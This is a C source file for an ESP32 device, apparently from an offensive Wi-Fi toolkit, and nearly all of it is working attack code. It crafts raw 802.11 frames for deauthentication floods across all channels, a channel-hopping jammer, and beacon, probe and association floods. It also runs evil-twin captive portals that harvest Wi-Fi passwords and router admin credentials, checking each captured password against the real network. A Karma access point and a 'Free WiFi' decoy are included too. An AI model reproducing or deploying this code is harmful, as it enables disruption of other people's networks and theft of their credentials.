#include "atk_wifi.h"
#include "attack.h"
#include "net.h"
#include "ui.h"
#include "hal.h"
#include "config.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <SD.h>

static int  wMode = 0;
static uint32_t pkts = 0;
static uint8_t hopCh = 1;
static String wStatus = "idle";
static uint8_t randMac[6];

static void randmac() { for (int i = 0; i < 6; i++) randMac[i] = random(256); randMac[0] |= 0x02; }

void wifi_set_channel(uint8_t ch) { esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE); }

void wifi_send_deauth(const uint8_t* bssid, uint8_t ch) {
  static uint8_t f[26];
  f[0] = 0xC0; f[1] = 0x00; f[2] = 0x3A; f[3] = 0x01;
  memset(&f[4], 0xFF, 6);
  memcpy(&f[10], bssid, 6);
  memcpy(&f[16], bssid, 6);
  f[22] = 0; f[23] = 0; f[24] = 0x02; f[25] = 0;
  wifi_set_channel(ch);
  esp_wifi_80211_tx(WIFI_IF_AP, f, 26, false);
}

static void send_frame(uint8_t* f, int len) {
  esp_wifi_80211_tx(WIFI_IF_AP, f, len, false);
}

static void send_beacon(const char* ssid, uint8_t ch) {
  uint8_t f[128]; memset(f, 0, sizeof(f));
  int p = 0; uint8_t sl = strlen(ssid); if (sl > 32) sl = 32;
  randmac();
  f[p++]=0x80; f[p++]=0x00; f[p++]=0x00; f[p++]=0x00;
  memset(&f[p],0xFF,6); p+=6;
  memcpy(&f[p],randMac,6); p+=6;
  memcpy(&f[p],randMac,6); p+=6;
  f[p++]=0; f[p++]=0;
  memset(&f[p],0,8); p+=8;
  f[p++]=0x64; f[p++]=0; f[p++]=0x01; f[p++]=0x04;
  f[p++]=0x00; f[p++]=sl; memcpy(&f[p],ssid,sl); p+=sl;
  f[p++]=0x01; f[p++]=0x04; f[p++]=0x82; f[p++]=0x84; f[p++]=0x8B; f[p++]=0x96;
  f[p++]=0x03; f[p++]=0x01; f[p++]=ch;
  wifi_set_channel(ch);
  send_frame(f, p);
}

static void send_probe(uint8_t ch) {
  uint8_t f[64]; memset(f, 0, sizeof(f));
  int p = 0;
  randmac();
  f[p++]=0x40; f[p++]=0x00; f[p++]=0; f[p++]=0;
  memset(&f[p],0xFF,6); p+=6;
  memcpy(&f[p],randMac,6); p+=6;
  memset(&f[p],0xFF,6); p+=6;
  f[p++]=0; f[p++]=0;
  f[p++]=0x00; f[p++]=0x00;
  f[p++]=0x01; f[p++]=0x04; f[p++]=0x82; f[p++]=0x84; f[p++]=0x8B; f[p++]=0x96;
  wifi_set_channel(ch);
  send_frame(f, p);
}

static void send_assoc(uint8_t ch) {
  uint8_t f[64]; memset(f, 0, sizeof(f));
  int p = 0;
  randmac();
  f[p++]=0x00; f[p++]=0x00; f[p++]=0; f[p++]=0;
  memcpy(&f[p],g_tBssid,6); p+=6;
  memcpy(&f[p],randMac,6); p+=6;
  memcpy(&f[p],g_tBssid,6); p+=6;
  f[p++]=0; f[p++]=0;
  f[p++]=0x11; f[p++]=0x04;
  f[p++]=0x0A; f[p++]=0x00;
  uint8_t sl = strlen(g_tSsid.c_str()); if (sl > 32) sl = 32;
  f[p++]=0x00; f[p++]=sl; memcpy(&f[p], g_tSsid.c_str(), sl); p+=sl;
  f[p++]=0x01; f[p++]=0x04; f[p++]=0x82; f[p++]=0x84; f[p++]=0x8B; f[p++]=0x96;
  wifi_set_channel(ch);
  send_frame(f, p);
}

static void enterRaw() {
  WiFi.mode(WIFI_AP_STA);
  esp_wifi_set_promiscuous(true);
}

static void wStart() {
  pkts = 0;
  const char* id = atk_current() ? atk_current()->id : "";
  if      (!strcmp(id, "wifi_deauth_all"))  wMode = 1;
  else if (!strcmp(id, "wifi_deauth_portal")) wMode = 2;
  else if (!strcmp(id, "wifi_deauth_admin"))  wMode = 3;
  else if (!strcmp(id, "wifi_beacon"))        wMode = 4;
  else if (!strcmp(id, "wifi_probe"))         wMode = 5;
  else if (!strcmp(id, "wifi_assoc"))         wMode = 6;
  else if (!strcmp(id, "wifi_jam"))           wMode = 7;
  else if (!strcmp(id, "wifi_karma"))         wMode = 8;
  else if (!strcmp(id, "wifi_dummy"))         wMode = 9;

  enterRaw();

  if (wMode == 2 || wMode == 3) {
    portal_clear_creds();
    portal_set_page(wMode == 2 ? PG_WARN : PG_ADMIN);
    net_ap_start(g_tSsid.c_str(), nullptr, g_tCh);
    portal_web_start();
    g_webMode = true;
    log_line("evil twin up: %s ch%u", g_tSsid.c_str(), g_tCh);
  } else if (wMode == 9) {
    net_ap_start("Free WiFi", nullptr, 1);
    portal_set_page(PG_DUMMY);
    portal_web_start();
    g_webMode = true;
  } else if (wMode == 8) {
    net_ap_start("KarmaAP", nullptr, 1);
    portal_web_start();
    g_webMode = true;
  }
  log_line("wifi attack %s armed", id);
}

static void wStop() {
  esp_wifi_set_promiscuous(false);
  portal_web_stop();
  net_ap_stop();
  net_sta_down();
  g_webMode = false;
  WiFi.mode(WIFI_STA);
}

static void wTick() {
  switch (wMode) {
    case 1: {
      for (uint8_t ch = 1; ch <= 13; ch++) {
        wifi_set_channel(ch);
        for (auto& a : g_aps) if (a.ch == ch) { wifi_send_deauth(a.bssid, ch); pkts++; }
        if (!g_aps.size()) { uint8_t b[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF}; wifi_send_deauth(b, ch); pkts++; }
      }
      char b[40]; snprintf(b, sizeof(b), "deauth all  pkts:%lu", (unsigned long)pkts);
      wStatus = b;
      break;
    }
    case 2:
    case 3: {
      wifi_send_deauth(g_tBssid, g_tCh);
      wifi_send_deauth(g_tBssid, g_tCh);
      pkts += 2;
      char b[48];
      snprintf(b, sizeof(b), "deauth+portal %lu creds:%d", (unsigned long)pkts, portal_cred_count());
      wStatus = b;
      if (portal_cred_count() > 0) {
        if (wMode == 3) {
          log_line("admin creds captured, closing");
          wStatus = "admin captured";
          // handled by main loop
        } else {
          if (!g_haveTarget) { /* target ssid == ap ssid */ }
          bool ok = net_sta_try(g_tSsid, portal_last_pass(), 6000);
          if (ok) {
            log_line("PASSWORD OK: %s", portal_last_pass().c_str());
            wStatus = String("OK: ") + portal_last_pass();
          } else {
            log_line("password wrong, resuming deauth");
            portal_clear_creds();
            net_sta_down();
          }
        }
      }
      break;
    }
    case 4: {
      char ssid[33];
      snprintf(ssid, sizeof(ssid), "AP_%05lu", (unsigned long)random(99999));
      send_beacon(ssid, 1 + (pkts % 13));
      pkts++;
      char b[40]; snprintf(b, sizeof(b), "beacon spam %lu", (unsigned long)pkts);
      wStatus = b;
      break;
    }
    case 5: {
      send_probe(1 + (pkts % 13));
      pkts++;
      char b[40]; snprintf(b, sizeof(b), "probe flood %lu", (unsigned long)pkts);
      wStatus = b;
      break;
    }
    case 6: {
      send_assoc(g_tCh);
      pkts++;
      char b[40]; snprintf(b, sizeof(b), "assoc flood %lu", (unsigned long)pkts);
      wStatus = b;
      break;
    }
    case 7: {
      uint8_t b[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
      wifi_set_channel(hopCh);
      for (int i = 0; i < 6; i++) { wifi_send_deauth(b, hopCh); pkts++; }
      hopCh = (hopCh >= 13) ? 1 : hopCh + 1;
      char s[40]; snprintf(s, sizeof(s), "jamming ch%u pkts:%lu", hopCh, (unsigned long)pkts);
      wStatus = s;
      break;
    }
    case 8: {
      // karma: sniff probes handled by promiscuous cb below; rotate AP ssid
      static uint32_t last = 0;
      if (millis() - last > 4000 && g_aps.size()) {
        last = millis();
      }
      pkts++;
      wStatus = String("karma ap: ") + String(WiFi.softAPgetStationNum()) + " clients";
      break;
    }
    case 9: {
      pkts++;
      wStatus = String("Free WiFi clients:") + String(WiFi.softAPgetStationNum());
      break;
    }
  }
}

static String wStat() { return wStatus; }

#define WA(id, name, desc, tgt) \
  static const Attack A_##id = { #id, name, "wifi", desc, tgt, 0, wStart, wStop, wTick, wStat };

WA(wifi_deauth_all,    "Deauth All",       "deauth every AP, all channels", false)
WA(wifi_deauth_portal, "Deauth + Portal",  "evil twin, verify password",    true)
WA(wifi_deauth_admin,  "Deauth + Admin",   "evil twin, grab admin creds",   true)
WA(wifi_beacon,        "Beacon Spam",      "flood random SSIDs",            false)
WA(wifi_probe,         "Probe Flood",      "flood probe requests",          false)
WA(wifi_assoc,         "Assoc Flood",      "flood association requests",    true)
WA(wifi_jam,           "2.4GHz Jammer",    "hop + blast all channels",      false)
WA(wifi_karma,         "Karma",            "AP answers all probes",         false)
WA(wifi_dummy,         "WiFi Dummy",       "Free WiFi + middle finger page",false)

void atk_wifi_register() {
  extern void atk_add(const Attack*);
  atk_add(&A_wifi_deauth_all); atk_add(&A_wifi_deauth_portal); atk_add(&A_wifi_deauth_admin);
  atk_add(&A_wifi_beacon); atk_add(&A_wifi_probe); atk_add(&A_wifi_assoc);
  atk_add(&A_wifi_jam); atk_add(&A_wifi_karma); atk_add(&A_wifi_dummy);
}